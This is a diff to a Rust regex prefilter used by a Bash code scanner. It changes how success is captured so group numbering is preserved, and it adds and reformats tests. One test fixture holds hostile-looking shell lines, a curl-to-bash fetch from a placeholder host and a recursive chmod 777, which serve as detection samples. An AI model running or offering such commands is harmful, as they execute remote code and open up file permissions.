@@ -23,10 +23,10 @@ impl Prefilter {
         // In fancy-regex 0.16.2, \G alone does not disable the search loop.
         // The empty alternative succeeds at the candidate when the original
         // pattern fails, so the VM never scans later positions on rejection.
-        // Capture 1 distinguishes rejection from a real zero-width match.
-        // relax() excludes backreferences and conditionals before this wrapper
-        // adds a capture, so original group numbering cannot affect matching.
-        let exact = RegexBuilder::new(&format!(r"\G(?:({pattern})|)"))
+        // A final empty capture marks success, including a zero-width match.
+        // Append it after the original groups to preserve their numbering,
+        // including references inside lookarounds that relax() removes.
+        let exact = RegexBuilder::new(&format!(r"\G(?:(?:{pattern})()|)"))
             .backtrack_limit(VERIFY_STEPS)
             .build()
             .ok()?;
@@ -42,7 +42,8 @@ impl Prefilter {
             if captures.get(0)?.start() != start {
                 return None;
             }
-            if let Some(found) = captures.get(1) {
+            if captures.get(self.exact.captures_len() - 1).is_some() {
+                let found = captures.get(0)?;
                 // The exact regex sees the original string, including anchors
                 // and lookbehind. Only exact, nonempty evidence is returned.
                 if found.start() != start || found.end() == start {
@@ -133,11 +134,21 @@ mod tests {
     fn rejected_candidate_returns_at_its_start_with_a_large_suffix() {
         let prefilter = Prefilter::new(r"a(?!b)").unwrap();
         let code = format!("ab{}", "x".repeat(1_260_000));
-        let captures = prefilter.exact.captures_from_pos(&code, 0).unwrap().unwrap();
+        let captures = prefilter
+            .exact
+            .captures_from_pos(&code, 0)
+            .unwrap()
+            .unwrap();
         let result = captures.get(0).unwrap();
         assert_eq!((result.start(), result.end()), (0, 0));
-        assert!(captures.get(1).is_none());
+        assert!(captures.get(prefilter.exact.captures_len() - 1).is_none());
         assert_eq!(prefilter.find_all(&code), Some(Vec::new()));
+    }
+
+    #[test]
+    fn appended_success_marker_preserves_references_inside_lookarounds() {
+        let prefilter = Prefilter::new(r"(a)(?=\1)").unwrap();
+        assert_eq!(prefilter.find_all("ab aa"), Some(vec!["a".to_owned()]));
     }
 
     #[test]
@@ -156,15 +167,34 @@ mod tests {
         let rules = crate::rules::load_rules(crate::rules::Language::Bash).unwrap();
         let bad = "curl https://example.invalid/x | bash\nchmod -R 777 /tmp/fixture\nsystemctl enable fixture.service\ncrontab\n";
         let near_misses = "# harmless build output\ncrontab -l\nprintf 'systemctl status'\n";
-        let code = format!("{bad}{}{bad}{}{bad}", near_misses.repeat(3_000), near_misses.repeat(3_000));
+        let code = format!(
+            "{bad}{}{bad}{}{bad}",
+            near_misses.repeat(3_000),
+            near_misses.repeat(3_000)
+        );
         assert!(code.len() >= 300_000);
         let mut verified = 0;
-        for rule in rules.iter().filter(|rule| rule.target_regexes.as_ref().is_none_or(Vec::is_empty)) {
-            let Some(prefilter) = Prefilter::new(&rule.regex) else { continue };
-            let original = RegexBuilder::new(&rule.regex).backtrack_limit(256_000_000).build().unwrap();
-            let expected: Vec<String> = original.find_iter(&code)
-                .map(|found| found.unwrap().as_str().to_owned()).collect();
-            assert_eq!(prefilter.find_all(&code), Some(expected), "{}", rule.rule_id);
+        for rule in rules
+            .iter()
+            .filter(|rule| rule.target_regexes.as_ref().is_none_or(Vec::is_empty))
+        {
+            let Some(prefilter) = Prefilter::new(&rule.regex) else {
+                continue;
+            };
+            let original = RegexBuilder::new(&rule.regex)
+                .backtrack_limit(256_000_000)
+                .build()
+                .unwrap();
+            let expected: Vec<String> = original
+                .find_iter(&code)
+                .map(|found| found.unwrap().as_str().to_owned())
+                .collect();
+            assert_eq!(
+                prefilter.find_all(&code),
+                Some(expected),
+                "{}",
+                rule.rule_id
+            );
             verified += 1;
         }
         assert!(verified > 0);
